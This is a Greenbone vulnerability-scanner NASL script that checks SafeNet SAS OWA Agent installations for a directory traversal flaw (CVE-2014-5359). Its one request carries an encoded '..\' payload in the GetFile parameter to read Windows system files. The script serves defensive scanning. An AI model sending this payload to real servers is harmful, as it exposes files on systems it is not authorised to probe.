# SPDX-FileCopyrightText: 2014 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:safenet-inc:safenet_authentication_service_outlook_web_access_agent";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.105152");
  script_version("2023-07-27T05:05:09+0000");
  script_cve_id("CVE-2014-5359");
  script_tag(name:"cvss_base", value:"7.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:N/A:N");
  script_tag(name:"last_modification", value:"2023-07-27 05:05:09 +0000 (Thu, 27 Jul 2023)");
  script_tag(name:"creation_date", value:"2014-12-22 16:04:07 +0100 (Mon, 22 Dec 2014)");
  script_name("SafeNet SAS OWA Agent Directory Traversal Vulnerability");

  script_tag(name:"summary", value:"Directory traversal vulnerability in SafeNet Authentication Service (SAS)
Outlook Web Access Agent (formerly CRYPTOCard).");

  script_tag(name:"vuldetect", value:"Send a crafted HTTP GET request
and check whether it is able to read arbitrary files or not.");

  script_tag(name:"insight", value:"Via a .. (dot dot) in the GetFile parameter to owa/owa it is possible to read arbitrary files.");

  script_tag(name:"impact", value:"Successful exploitation will allow remote
  attackers to download arbitrary files.");

  script_tag(name:"affected", value:"SafeNet Authentication Service before 1.03.30109");
  script_tag(name:"solution", value:"Update to 1.03.30109 or later.");

  script_tag(name:"solution_type", value:"VendorFix");

  script_xref(name:"URL", value:"http://appcheck-ng.com/safenet-sas-owa-agent-directory-traversal-vulnerability/");

  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_copyright("Copyright (C) 2014 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("gb_safenet_sas_owa_agent_detect.nasl", "os_detection.nasl");
  script_require_ports("Services/www", 443);
  script_mandatory_keys("ms/owa/outlook_web_access_agent/installed");
  exit(0);
}

include("misc_func.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");
include("os_func.inc");

if( ! port = get_app_port( cpe:CPE ) ) exit( 0 );
files = traversal_files( "windows" );

foreach file ( keys ( files ) )
{
  url = '/owa/owa?Application=Exchange&GetFile=..%5C..%5C..%5C..%5C..%5C..%5C' + files[file];
  if( http_vuln_check( port:port, url:url, pattern:file ) )
  {
    security_message( port:port );
    exit( 0 );
  }
}

exit( 99 );
